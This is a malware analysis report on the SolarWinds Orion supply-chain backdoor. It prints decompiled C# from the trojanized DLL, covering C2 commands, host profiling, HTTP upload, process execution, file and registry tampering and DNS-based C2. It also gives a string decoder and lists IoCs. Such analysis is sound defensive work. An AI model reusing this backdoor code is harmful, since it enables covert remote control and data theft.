## Solarwinds Supply Chain Attack
Adversaries gained access to numerous public and private organizations by trojanized SolarWinds Orion software applications updates **(This attack is large, bad and very concerning)**

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - md5 02af7cec58b9a5da1c542b5a32151ba1

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/md5file.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - info

```
Name 		solarwinds-core-v2019.4.5220-hotfix5.msp
md5 		02af7cec58b9a5da1c542b5a32151ba1
sha1 		1b476f58ca366b54f34d714ffce3fd73cc30db1a
sha256 		d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600
ssdeep 		3145728:yMbnCpAK7nuv7xYiq0bC4zheqeRHuCieBVZNP7WJOQeXt+9riYBaeIBjSxTusL:yMbCp7uf3GnqfCVrNPgLrW4GoxSG
size 		204.88MB
bytes 		214831104
mime 		application/vnd.ms-msi
extension 	application/octet-stream
Entropy 	7.9988851973414095 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - metadata

```
codepage 		0
title 			Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
subject 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
author 			SolarWinds Worldwide, LLC.
comments 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
template 		{079A74C5-95D0-446E-86F7-B8EAF0A29654}
last_saved_by 		:RTM.1;:#RTM.1
revision_number 	{8413ED57-01DD-48F7-B521-B6C5DE1A54DF}
create_time 		2020-03-24 10:56:48
last_saved_time 	2020-03-24 10:56:48
num_words 		5
creating_application 	Windows Installer XML Toolset (3.9.1208.0)
security 		4
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/extracted.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files md5

```
34e9e373b21e8d8f0051f8c88e10008d  BigintOverflowFix.sql
b03dcbc2ba9114b09c04ea24c9c63321  ClearOldDataFromDetailAndHourlyTables.sql
60222d9d1766ca72eb7aa2aa79b76fad  ConfigurationWizard.exe
79b811614f6e733192271ae8cee7db7e  ConfigurationWizard.exe.config
8f9360404210799ebae3731dfc5dd93d  Core_Linux_2019.4.5200.9083.apkg
a42d681ac61a4fa1d85f5812aaddd7a4  Core.Settings.json
5026956e672613583a1fa4853f792301  dbsetup_pretimeseriesorder.txt
a6a7552de53fb9011297fd8bec604d4e  Interop.NetFWTypeLib.dll
c96d6e4342ffe7bcaea1abd744f084fd  Interop.olelib.dll
39b3853848d7d01ff752c96e709dbae6  Interop.OrionSWScheduler8.dll
b93e78593460cdddefcc44d6e51c86ba  Interop.TaskScheduler.dll
c9799173b23ae28cfa58168ddc46e3fa  IS2.SolarWinds.Orion.Core.Common.dll
572f3ab5036cc50e6e245c1ef1d084d9  IS3.SolarWinds.Data.Providers.Orion.Containers.v3.dll
943d50919c7a8df571cd500e0a418a67  IS3.SolarWinds.Data.Providers.Orion.v3.dll
c9799173b23ae28cfa58168ddc46e3fa  IS3.SolarWinds.Orion.Core.Common.dll
be8fb541d3c916b4d91f59f331a62d41  ISv2.SolarWinds.Orion.Swis.PubSub.dll
be8fb541d3c916b4d91f59f331a62d41  ISv3.SolarWinds.Orion.Swis.PubSub.dll
2241d9333baa0b61b95efaf5c70144ea  NetPerfMon_WebSite.precompiled.zip
0b9c58cbcf1bb2476b149c43d071959e  NetPerfMon_WebSite.zip
b917980a6dad722a4970c7c326c6db9b  OrionCoreDatabaseScheme.dbConfig
7905e0abd29412f11bb37c02aa370cc3  OrionWeb.dll
423238911cb6be14866f815f7f234dca  Orion.xml
f4c561e087aaa20e676aca2f5dfe516a  PM_2019.4_Patch.zip
7392101b7b29b0d976db655cd6b08a18  SolarWinds.ConfigurationWizard.Plugin.Common.dll
6a2c2a4d0b3b79ffd115d7f7b6ce8a8c  SolarWinds.ConfigurationWizard.Plugin.Orion.dll
b5ab5b5a7c2e2421680f5f8b6ba86e84  SolarWinds.Database.TimeSeries.Contracts.dll
db61b8bcf5b44b790dd99f6a6c5eedd7  SolarWinds.Database.TimeSeries.dll
b12c00167341703faa428ec806ba9cc3  SolarWinds.Data.Entity.dll
b91ce2fa41029f6955bff20079468448  SolarWinds.Orion.Core.BusinessLayer.dll  <--malicious
510af37d73ab0378ec8c62c820536525  SolarWinds.Orion.Core.BusinessLayer.dll.config
73a207c34cdf8f63eb9ef5252aba7022  SolarWinds.Orion.Core.Collector.dll
c9799173b23ae28cfa58168ddc46e3fa  SolarWinds.Orion.Core.Common.dll
0943bf039fadeec49f48ea488ce0225c  SolarWinds.Orion.Core.Strings.dll
4010fef59f8aa41b476306095a6eb970  SolarWinds.Orion.Core.Strings.resources.dll.de.file
4f27bace92d5f0fd4122e90f405d736c  SolarWinds.Orion.Core.Strings.resources.dll.ja.file
be8fb541d3c916b4d91f59f331a62d41  SolarWinds.Orion.Swis.PubSub.dll
123878cf5bb61c095369bad5b72bc516  Solarwinds.Settings.dll
24c5cdcd69ed8466eda14e8ced59bdba  taskschd.dll
c1c201388736053e9a883867dd5aba79  Toolset_2019.4_Patch.zip
a56b277160c716b1454e8fa3a7322393  TruncateFirstAndLastPartitions.sql
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - info

```
Name 		solarwinds.orion.core.businesslayer.dll
md5 		b91ce2fa41029f6955bff20079468448
sha1 		76640508b1e7759e548771a5359eaed353bf1eec
sha256 		32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77
ssdeep 		12288:Zx7m/z9aEBzvnvLtYAi6uLlYQ69BBpIvF1tjpH7BKi+0A8vca9owQ:6aEBTvRBi6uL6dIvDtjpH9+0A8vca9oD
size 		987.34KB
bytes 		1011032
mime 		application/x-dosexec
extension 	application/x-msdos-program
Entropy 	5.582826996737918 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - signed - T1553.002 Code Signing

```
CommonName 		Solarwinds Worldwide, LLC
OrganizationalUnit 	None
Organization 		Solarwinds Worldwide, LLC
Locality 		Austin
StateOrProvinceName 	None
CountryName 		US
Start 			Jan 21 00:00:00 2020 GMT
Ends 			Jan 20 23:59:59 2023 GMT
SerialNumber 		21150566861557194870231784728595120365
SerialNumberMD5 	08e35543d6110ed11fdf558bb093d401
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - metadata

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/businesslayermeta.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - function - T1587.001 Develop Capabilities: Malware

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/function.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - variables - T1027 Obfuscated Files or Information

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/vars.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - Pyhton Decoder (base64 + zlib)

```
from base64 import b64decode
from zlib import decompress

def decode(string):
    return decompress(b64decode(string),-15)

for x in ['SywrLstNzskvTdFLzs8FAA==','SywoKK7MS9ZNLMgEAA==','Sy3VLU8tLtE1BAA=','Ky3WLU8tLtE1AgA=','Ky3WTU0sLtE1BAA=','Ky3WTU0sLtE1AgA=']:
	print(x," -> ", decode(x).decode('utf-8'))
```
```
SywrLstNzskvTdFLzs8FAA==  ->  avsvmcloud.com
SywoKK7MS9ZNLMgEAA==  ->  appsync-api
Sy3VLU8tLtE1BAA=  ->  eu-west-1
Ky3WLU8tLtE1AgA=  ->  us-west-2
Ky3WTU0sLtE1BAA=  ->  us-east-1
Ky3WTU0sLtE1AgA=  ->  us-east-2
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 - TA0011 Command and Control

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/c2.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 structure

```csharp
private enum JobEngine
{
	Idle,
	Exit,
	SetTime,
	CollectSystemDescription,
	UploadSystemDescription,
	RunTask,
	GetProcessByDescription,
	KillTask,
	GetFileSystemEntries,
	WriteFile,
	FileExists,
	DeleteFile,
	GetFileHash,
	ReadRegistryValue,
	SetRegistryValue,
	DeleteRegistryValue,
	GetRegistrySubKeyAndValueNames,
	Reboot,
	None
}
```
<br /><br />
Set delay for http helper - T1587.001 Virtualization/Sandbox Evasion

```csharp
public static void SetTime(string[] args, out int delay)
{
	delay = int.Parse(args[0]);
}
```
<br /><br />
Get host info - T1082 System Information Discovery & T1016 System Network Configuration Discovery

```csharp
public static void CollectSystemDescription(string info, out string result)
{
	result = null;
	int num = 0;
	string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
	try
	{
		string str = ((SecurityIdentifier)new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
		result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
	}
	catch
	{
		result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
	}
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
	result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
}
```
<br /><br />
Perform http request - T1071.001 Web Protocols

```csharp
public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
{
	result = null;
	string requestUriString = args[0];
	string s = args[1];
	string text = (args.Length >= 3) ? args[2] : null;
	string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
	{
		"\r\n",
		"\r",
		"\n"
	}, StringSplitOptions.None);
	HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
	HttpWebRequest httpWebRequest2 = httpWebRequest;
	httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
	httpWebRequest.Proxy = proxy;
	httpWebRequest.Timeout = 120000;
	httpWebRequest.Method = array[0].Split(new char[]
	{
		' '
	})[0];
	foreach (string text2 in array)
	{
		int num = text2.IndexOf(':');
		if (num > 0)
		{
			string text3 = text2.Substring(0, num);
			string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
			if (!WebHeaderCollection.IsRestricted(text3))
			{
				httpWebRequest.Headers.Add(text2);
			}
			else
			{
				ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
				if (hash <= 8873858923435176895UL)
				{
					if (hash <= 6116246686670134098UL)
					{
						if (hash != 2734787258623754862UL)
						{
							if (hash == 6116246686670134098UL)
							{
								httpWebRequest.ContentType = text4;
							}
						}
						else
						{
							httpWebRequest.Accept = text4;
						}
					}
					else if (hash != 7574774749059321801UL)
					{
						if (hash == 8873858923435176895UL)
						{
							if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL)
							{
								httpWebRequest.ServicePoint.Expect100Continue = true;
							}
							else
							{
								httpWebRequest.Expect = text4;
							}
						}
					}
					else
					{
						httpWebRequest.UserAgent = text4;
					}
				}
				else if (hash <= 11266044540366291518UL)
				{
					if (hash != 9007106680104765185UL)
					{
						if (hash == 11266044540366291518UL)
						{
							ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
							httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
							httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
						}
					}
					else
					{
						httpWebRequest.Referer = text4;
					}
				}
				else if (hash != 15514036435533858158UL)
				{
					if (hash == 16066522799090129502UL)
					{
						httpWebRequest.Date = DateTime.Parse(text4);
					}
				}
				else
				{
					httpWebRequest.Date = DateTime.Parse(text4);
				}
			}
		}
	}
	result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
	result = result + httpWebRequest.Headers.ToString() + "\n\n";
	if (!string.IsNullOrEmpty(text))
	{
		using (Stream requestStream = httpWebRequest.GetRequestStream())
		{
			byte[] array3 = Convert.FromBase64String(text);
			requestStream.Write(array3, 0, array3.Length);
		}
	}
	using (WebResponse response = httpWebRequest.GetResponse())
	{
		result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
		result = result + response.Headers.ToString() + "\n";
		using (Stream responseStream = response.GetResponseStream())
		{
			result += new StreamReader(responseStream).ReadToEnd();
		}
	}
}
```
<br /><br />
UploadSystemDescription - Python fnv 64 hash logic
```python
def encrypt_fnv_64(string):
    hval = 14695981039346656037
    for letter in string:
        hval = hval ^ ord(letter)
        hval = (hval * 1099511628211) % (2 ** 64)
    return hval ^ 6605813339339102567
```

```
7574774749059321801  	->  user-agent
9007106680104765185  	->  referer
6116246686670134098  	->  content-type
16066522799090129502  	->  date
14226582801651130532  	->  close
2734787258623754862  	->  accept
11266044540366291518  	->  connection
8873858923435176895  	->  expect
13852439084267373191  	->  keep-alive
1475579823244607677  	->  100-continue
```

<br /><br />
Start a process -  T1569.002 Service Execution & T1543.003 Create or Modify System Process 

```csharp
public static int RunTask(string[] args, string cl, out string result)
{
	result = null;
	string fileName = Environment.ExpandEnvironmentVariables(args[0]);
	string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
	using (Process process = new Process())
	{
		process.StartInfo = new ProcessStartInfo(fileName, arguments)
		{
			CreateNoWindow = false,
			UseShellExecute = false
		};
		if (process.Start())
		{
			result = process.Id.ToString();
			return 0;
		}
	}
	return 1;
}

```
<br /><br />
Get processes info - T1057 Process Discovery

```csharp
public static void GetProcessByDescription(string[] args, out string result)
{
	result = null;
	if (args.Length == 0)
	{
		foreach (Process process in Process.GetProcesses())
		{
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
		}
		return;
	}
	using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
	{
		foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
		{
			ManagementObject managementObject = (ManagementObject)managementBaseObject;
			string[] array = new string[]
			{
				string.Empty,
				string.Empty
			};
			ManagementObject managementObject2 = managementObject;
			string methodName = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
			object[] array2 = array;
			object[] args2 = array2;
			Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
			{
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
				OrionImprovementBusinessLayer.Quote(managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()),
				managementObject[args[0]],
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
				array[1],
				array[0]
			});
		}
	}
}
```
<br /><br />
Kill a task by PID - T1489 Service Stop & T1543.003 Create or Modify System Process

```csharp
public static void KillTask(string[] args)
{
	Process.GetProcessById(int.Parse(args[0])).Kill();
}
```
<br /><br />
Get files and folders by path - T1083 File and Directory Discovery

```csharp
public static void GetFileSystemEntries(string[] args, out string result)
{
	string searchPattern = (args.Length >= 2) ? args[1] : "*";
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	string[] value = (from f in Directory.GetFiles(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
}
```
<br /><br />
Write to file - T1105 Ingress Tool Transfer

```csharp
public static void WriteFile(string[] args)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	byte[] array = Convert.FromBase64String(args[1]);
	for (int i = 0; i < 3; i++)
	{
		try
		{
			using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
			{
				fileStream.Write(array, 0, array.Length);
			}
			break;
		}
		catch (Exception)
		{
			if (i + 1 >= 3)
			{
				throw;
			}
		}
		OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
	}
}

```
<br /><br />
Check if file exists - T1083 File and Directory Discovery

```csharp
public static void FileExists(string[] args, out string result)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	result = File.Exists(path).ToString();
}

```
<br /><br />
Delete file by path - T1070.004 File Deletion

```csharp
public static void DeleteFile(string[] args)
{
	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
}
```
<br /><br />
Get a registry value - T1012 Query Registry

```csharp
public static int ReadRegistryValue(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
	if (result != null)
	{
		return 0;
	}
	return 1;
}
```
<br /><br />
Modfiy a registry value - T1112 Modify Registry

```csharp
public static int SetRegistryValue(string[] args)
{
	RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
	string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
	if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
	{
		return 1;
	}
	return 0;
}
```
<br /><br />
Delete a registry value - T1112 Modify Registry

```csharp
public static void DeleteRegistryValue(string[] args)
{
	OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
}
```
<br /><br />
Get all registry keys and values - T1012 Query Registry

```csharp
public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
}
```
<br /><br />
Update - T1568.002 Domain Generation Algorithms & T1071.004 Application Layer Protocol: DNS

```csharp
private static void Update()
{
	bool flag = false;
	OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
	OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
	Thread thread = null;
	bool flag2 = true;
	OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
	int num = 0;
	bool flag3 = true;
	OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
	Random random = new Random();
	int a = 0;
	if (!OrionImprovementBusinessLayer.UpdateNotification())
	{
		return;
	}
	OrionImprovementBusinessLayer.svcListModified2 = false;
	int num2 = 1;
	while (num2 <= 3 && !flag)
	{
		OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
		if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
		{
			if (OrionImprovementBusinessLayer.svcListModified1)
			{
				flag3 = true;
			}
			num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
			string hostName;
			if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
			{
				hostName = ((addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
			}
			else
			{
				if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					break;
				}
				hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
			}
			addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
			switch (addressFamilyEx)
			{
			case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					flag3 = false;
					if (dnsRecords.dnssec)
					{
						a = dnsRecords.A;
						dnsRecords.A = random.Next(1, 3);
					}
				}
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
				{
					OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
				}
				if (!string.IsNullOrEmpty(dnsRecords.cname))
				{
					dnsRecords.A = a;
					OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
					httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
					if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
					{
						OrionImprovementBusinessLayer.svcListModified2 = false;
						thread = new Thread(new ThreadStart(httpHelper.Initialize))
						{
							IsBackground = true
						};
						thread.Start();
					}
				}
				num2 = 0;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
				OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
				OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
				}
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
				goto IL_1F7;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
				dnsRecords.A = random.Next(420, 540);
				break;
			default:
				goto IL_1F7;
			}
			IL_1F9:
			num2++;
			continue;
			IL_1F7:
			flag = true;
			goto IL_1F9;
		}
		break;
	}
	OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
}
```

## Domain Lookup
```
{
    "create_date": "2018-07-25",
    "update_date": "2020-10-08",
    "expiry_date": "2023-07-25",
    "domain_registrar": {
        "iana_id": 146,
        "registrar_name": "GoDaddy.com, LLC",
        "whois_server": "whois.godaddy.com",
        "website_url": "http://www.godaddy.com",
        "email_address": "abuse@godaddy.com",
        "phone_number": "+1.4806242505"
    },
    "registrant_contact": {
        "full_name": "Registration Private",
        "company_name": "Domains By Proxy, LLC",
        "mailing_address": "DomainsByProxy.com 14455 N. Hayden Road",
        "city_name": "Scottsdale",
        "state_name": "Arizona",
        "zip_code": "85260",
        "country_name": "United States",
        "country_code": "US",
        "email_address": "avsvmcloud.com@domainsbyproxy.com",
        "phone_number": "+1.4806242599",
        "fax_number": "+1.4806242598"
    },
    "name_servers": [
        "a1-139.avsvmcloud.com",
        "a11-64.avsvmcloud.com",
        "a20-65.avsvmcloud.com",
        "a26-67.avsvmcloud.com",
        "a4-65.avsvmcloud.com",
        "a6-66.avsvmcloud.com"
    ],
    "domain_status": [
        "clientDeleteProhibited",
        "clientRenewProhibited",
        "clientTransferProhibited",
        "clientUpdateProhibited"
    ]
}
```

## IoCs

```
02af7cec58b9a5da1c542b5a32151ba1
b91ce2fa41029f6955bff20079468448
08e35543d6110ed11fdf558bb093d401
2c4a910a1299cdae2a4e55988a2f102e
846e27a652a5e1bfbd0ddd38a16dc865
4f2eb62fa529c0283b28d05ddd311fae
56ceb6d0011d87b6e4d7023d7ef85676
```

```
avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com 
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-east-2.avsvmcloud[.]com
freescanonline[.]com
deftsecurity[.]com
thedoccloud[.]com
incomeupdate[.]com
websitetheme[.]com
zupertech[.]com
highdatabase[.]com
panhardware[.]com
databasegalore[.]com
```

```
5.252.177.25
5.252.177.21
204.188.205.176
51.89.125.18
167.114.213.199
```

## References

- https://www.solarwinds.com/security/security-statement
- https://github.com/fireeye/sunburst_countermeasures
- https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html
- https://www.zdnet.com/article/microsoft-fireeye-confirm-solarwinds-supply-chain-attack/
- https://cyber.dhs.gov/ed/21-01/

## Files
- SolarWinds.Orion.Core.BusinessLayer.dll.zip pass: infected

## Mapped Attacks Refs
[https://tools.qeeqbox.com/mitre-visualizer.html](https://tools.qeeqbox.com/mitre-visualizer.html)

<img src="https://raw.githubusercontent.com/qeeqbox/mitre-visualizer/main/readme/intro.png" style="max-width:768px"/>
